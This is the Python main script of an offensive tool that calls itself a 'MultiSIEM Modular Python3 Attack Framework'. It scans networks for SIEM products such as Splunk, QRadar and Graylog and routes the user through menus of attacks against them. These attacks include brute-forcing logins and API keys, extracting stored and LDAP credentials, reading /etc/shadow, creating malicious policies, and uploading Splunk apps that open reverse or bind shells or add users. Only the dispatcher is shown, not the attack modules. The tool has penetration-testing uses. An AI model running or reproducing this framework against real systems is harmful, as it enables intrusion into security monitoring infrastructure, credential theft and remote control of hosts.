#!/usr/bin/env python3

"""
------------------------------------------------------------------------------
	SIEMS FRAMEWORK - Agosto 2019 - Yamila Levalle @ylevalle
	Actualizacion - Enero 2020 - Diego Espitia @dsespitia
------------------------------------------------------------------------------
"""

# %%%%%%%%%%% Libraries %%%%%%%%%%%#


import os
import re
import globals
import colorama

from time import sleep
from colorama import Fore
from colorama import Style

from graylog.bruteforcegraylog import graylog_brute
from graylog.testcredentialsgraylog import default_web_credentials
from graylog.testcredentialsgraylog import default_ssh_credentials
from graylog.obtainmongodbcredentials import test_mongo_credentials
from graylog.obtaincredentialsrestapi import obtain_ldap_credentials
from graylog.alarmcallback import alarm_callback
from graylog.obtaininputsrestapi import obtain_inputs

from ossim.bruteforceossim import ossim_brute
from ossim.obtainconfigossim import ossim_config
from ossim.maliciousaction import create_policy

from scanning import input_ip
from scanning import input_port
from scanning import input_net
from scanning import scan_network
from scanning import scan_host

from splunk.obtainsysteminfo import obtain_system_info
from splunk.obtainpwds import obtain_credentials
from splunk.installshell import install_app
from splunk.bruteforcesplunk import bruteforce_splunk
from splunk.readfile import read_file
from splunk.obtainsplunkinfo import obtain_splunk_info
from splunk.testovacredentials import test_ova_credentials

from qradar.bruteforceqradar import qradar_brute
from qradar.apikeybruteqradar import qradar_apikeybrute
from qradar.obtainqradarinfo import qradar_info
from qradar.userdbqradar import qradar_usersdb

from mcafee.bruteforcemcafee import mcafee_brute
from mcafee.bruteforcessh import mcafee_ssh_brute
from mcafee.obtainsysteminfo import mcafee_ssh_info
from mcafee.obtainwebinfo import mcafee_webinfo
from mcafee.obtainuserssystem import mcafee_users_server

from siemonster.bfssh_smonster import smonster_ssh_bf
from siemonster.systeminfo_smonster import smonster_ssh_info
from siemonster.usersso_smonster import smonster_users_server

from elasticsiem.bruteforcessh import elastic_ssh_brute
from elasticsiem.sysinfo_elastic import elastic_ssh_info

# %%%%%%% Context Variables %%%%%%%#

VERSION = 1.1
SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%%% Functions %%%%%%%%%%%#


def banner():
	b = """
   _____ _____ ______ __  __       ______                                           _    
  / ____|_   _|  ____|  \/  |     |  ____|                                         | |   
 | (___   | | | |__  | \  / |___  | |__ _ __ __ _ _ __ ___   _____      _____  _ __| | __
  \___ \  | | |  __| | |\/| / __| |  __| '__/ _` | '_ ` _ \ / _ \ \ /\ / / _ \| '__| |/ /
  ____) |_| |_| |____| |  | \__ \ | |  | | | (_| | | | | | |  __/\ V  V / (_) | |  |   < 
 |_____/|_____|______|_|  |_|___/ |_|  |_|  \__,_|_| |_| |_|\___| \_/\_/ \___/|_|  |_|\_\
                                                                                         

MultiSIEM Modular Python3 Attack Framework 
By ElevenPaths https://www.elevenpaths.com/
Usage: python3 ./siemsframework.py
"""
	print(Fore.CYAN + Style.BRIGHT + b)

# %%%%%%%%%% Menu %%%%%%%%%#


def menus(menu):
	globals.messages(1, '')
	if menu == 1:
		options = enumerate(globals.main_menu, 1)
	elif menu == "Splunk":
		options = enumerate(globals.splunk_menu, 1)
	elif menu == "Graylog":
		options = enumerate(globals.graylog_menu, 1)
	elif menu == "OSSIM":
		options = enumerate(globals.ossim_menu, 1)
	elif menu == "QRadar":
		options = enumerate(globals.qradar_menu, 1)
	elif menu == "McAfee":
		options = enumerate(globals.mcafee_menu, 1)
	elif menu == "SIEMonster":
		options = enumerate(globals.smonster_menu, 1)
	elif menu == "ElasticSIEM":
		options = enumerate(globals.elastic_menu, 1)
	elif menu == 2:
		options = enumerate(globals.app_menu, 1)

	for c, i in options:
		print(Fore.GREEN + Style.BRIGHT + '\t[' + str(c) + '] ' + i)

	if menu == 1:
		print(Fore.GREEN + Style.BRIGHT + '\t[X] Exit')
	elif menu == 2:
		print(Fore.GREEN + Style.BRIGHT + '\t[X] Return to Attack Menu')
	else:
		print(Fore.GREEN + Style.BRIGHT + '\t[X] Return to Main Menu')
	print(Fore.GREEN + Style.BRIGHT + SEPARATOR)

	choice = input(
		Fore.CYAN + Style.NORMAL + "[!] Enter your selection: " + Style.RESET_ALL)
	return choice


# %%%%%%%%%% Menu Choices %%%%%%%%%#


def attack_choice(siemdetected, ip, port):
	choiceerror = 0
	attackchoice = menus(siemdetected)

	if siemdetected == "Splunk":
		splunk_attack(attackchoice, ip, port)
	elif siemdetected == "Graylog":
		graylog_attack(attackchoice, ip, port)
	elif siemdetected == "OSSIM":
		ossim_attack(attackchoice, ip, port)
	elif siemdetected == "QRadar":
		qradar_attack(attackchoice, ip, port)
	elif siemdetected == "McAfee":
		mcafee_attack(attackchoice, ip, port)
	elif siemdetected == "SIEMonster":
		smonster_attack(attackchoice, ip, port)
	elif siemdetected == "ElasticSIEM":
		elastic_attack(attackchoice, ip, port)
	elif attackchoice.lower() == "x":
		main_choice()
	else:
		globals.messages(2)
		sleep(1)
		attack_choice(siemdetected, ip, port)
		choiceerror = 1

	if attackchoice != "0" and choiceerror != 1:  # Not return and not error
		choice3 = input(
			Fore.CYAN + Style.BRIGHT +
			"[!] Do you want to return to the attack menu (Y/N): " +
			Style.RESET_ALL)
		if choice3.lower() == "y":
			attack_choice(siemdetected, ip, port)
		else:
			main_choice()


def app_choice(siemdetected, ip, port):
	appchoice = menus(2)
	if siemdetected == "Splunk":
		app_splunk_attack(appchoice, ip, port)
	elif appchoice.lower() == "x":  # Return
		attack_choice(siemdetected, ip, port)


def splunk_attack(attackchoice, ip, port):
	if attackchoice == "1":  # Bruteforce Splunk Admin
		bruteforce_splunk(ip, port)
	elif attackchoice == "2":  # Obtain Server Information
		obtain_splunk_info(ip, port)
	elif attackchoice == "3":  # Obtain System Information
		obtain_system_info(ip, port)
	elif attackchoice == "4":  # Obtain Splunk Passwords
		obtain_credentials(ip, port)
	elif attackchoice == "5":  # Read /etc/shadow
		read_file(ip, port)
	elif attackchoice == "7":  # Upload Malicious App
		app_choice("Splunk", ip, port)
	elif attackchoice == "8":  # Test OVA Credentials
		test_ova_credentials(ip)


def app_splunk_attack(appchoice, ip, port):
	appname = None
	if appchoice == "1":  # Linux Reverse Shell
		appname = "rshell.tar.gz"
	elif appchoice == "2":  # Linux Bind Shell
		appname = "bshell.tar.gz"
	elif appchoice == "3":  # Windows Reverse Shell
		appname = "wrshell.tar.gz"
	elif appchoice == "4":  # Windows Bind Shell
		appname = "wbshell.tar.gz"
	elif appchoice == "5":  # Windows UF Add User
		appname = "wadduser.tar.gz"
	elif appchoice == "6":  # Windows UF Bind Shell
		appname = "wbshellexe.tar.gz"

	if appchoice != "0" and appname:  # Not return and valid app selection
		install_app(ip, port, appname)
		choice3 = input(
			Fore.CYAN + Style.BRIGHT +
			"[!] Do you want to return to the attack menu (Y/N): "
			+ Style.RESET_ALL)

		if choice3.lower() == "y":
			attack_choice('Splunk', ip, port)
		else:
			main_choice()


def graylog_attack(attackchoice, ip, port):
	if attackchoice == "1":  # Bruteforce Graylog
		graylog_brute(ip, port)
	elif attackchoice == "2":  # Test Default Credentials
		default_web_credentials(ip, port)
		default_ssh_credentials(ip)
	elif attackchoice == "3":  # Test MongoDB
		test_mongo_credentials(ip)
	elif attackchoice == "4":  # Obtain credentials from API
		obtain_ldap_credentials(ip, port)
	elif attackchoice == "5":  # Inputs from API
		obtain_inputs(ip, port)
	elif attackchoice == "6":  # Alarm Callback
		alarm_callback(ip, port)


def ossim_attack(attackchoice, ip, port):
	if attackchoice == "1":  # Bruteforce OSSIM
		ossim_brute(ip, port)
	elif attackchoice == "2":  # Obtain Configuration
		ossim_config(ip, port)
	elif attackchoice == "3":  # Malicious Policy and Action
		create_policy(ip, port)


def qradar_attack(attackchoice, ip, port):
	if attackchoice == "1":  # Bruteforce QRadar
		qradar_brute(ip, port)
	elif attackchoice == "2":  # API Bruteforce QRadar
		qradar_apikeybrute(ip, port)
	elif attackchoice == "3":  # Obtain Information QRadar
		qradar_info(ip, port)
	elif attackchoice == "4":  # Obtain Usernames of Ariel DB QRadar
		qradar_usersdb(ip, port)


def mcafee_attack(attackchoice, ip, port):
	if attackchoice == '1':
		mcafee_brute(ip, port)
	elif attackchoice == '2':
		mcafee_ssh_brute(ip)
	elif attackchoice == '3':
		mcafee_ssh_info(ip)
	elif attackchoice == '4':
		mcafee_webinfo(ip, port)
	elif attackchoice == '5':
		mcafee_users_server(ip)


def smonster_attack(attackchoice, ip, port):
	if attackchoice == '1':
		smonster_ssh_bf(ip)
	elif attackchoice == '2':
		smonster_ssh_info(ip)
	elif attackchoice == '3':
		smonster_users_server(ip)


def elastic_attack(attackchoice, ip, port):
	if attackchoice == '1':
		elastic_ssh_brute(ip)
	elif attackchoice == '2':
		elastic_ssh_info(ip)
	elif attackchoice == '3':
		smonster_users_server(ip)


def scan_detect():
	ip = input_ip()
	port = input_port()
	siemdetected = ''
	if (ip and port) != '':
		siemdetected = scan_host(ip, port)
	else:
		globals.messages(3)
		sleep(1)
		main_choice()

	choice2 = input(
		Fore.CYAN + Style.BRIGHT + "[!] Do you want to launch the " +
		siemdetected + " attack module (Y/N): " + Style.RESET_ALL)

	if choice2.lower() == "y":
		if port == 0 and siemdetected == "Splunk":
			attack_choice(siemdetected, ip, '8089')
		elif port == 0 and siemdetected == "Graylog":
			attack_choice(siemdetected, ip, '9000')
		elif port == 0 and (
				siemdetected == "OSSIM" or siemdetected == "QRadar"
				or siemdetected == "McAfee" or siemdetected == "SIEMonster"):
			attack_choice(siemdetected, ip, '443')
		else:
			attack_choice(siemdetected, ip, port)
	else:
		main_choice()


def find_siem():
	siemsdetected = {}
	siemnet = input_net()

	if re.search(globals.net_val, siemnet):
		ips = scan_network(siemnet)
	else:
		globals.messages(4)
		sleep(1)
		main_choice()
	globals.messages(6)

	for host in ips:
		siemdetected = scan_host(host, '0')
		siemsdetected[host] = siemdetected

	siemchoice = input(
		Fore.CYAN + Style.BRIGHT +
		"[!] Enter the IP address of the SIEM to attack: " +
		Style.RESET_ALL)
	portchoice = input(
		Fore.CYAN + Style.BRIGHT + "[!] Enter the port of the SIEM to attack: " +
		Style.RESET_ALL)

	choice2 = input(
		Fore.CYAN + Style.BRIGHT + "[!] Do you want to launch the " +
		siemsdetected[siemchoice] + " attack module (Y/N): " + Style.RESET_ALL)

	if choice2.lower() == "y":
		attack_choice(siemsdetected[siemchoice], siemchoice, portchoice)
	else:
		main_choice()


def main_choice():
	choice = menus(1)

	if choice == "1":  # Scan and Detect SIEM
		scan_detect()
	elif choice == "2":  # Find SIEM on the Network
		find_siem()
	elif choice.upper() == "X":
		quit()
	else:
		globals.messages(2)
		main_choice()


# %%%%%%%%%% Main %%%%%%%%%#

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	colorama.init(autoreset="True")
	banner()
	main_choice()


if __name__ == '__main__':
	main()

# %%%%%%%%%% The End %%%%%%%%%%#
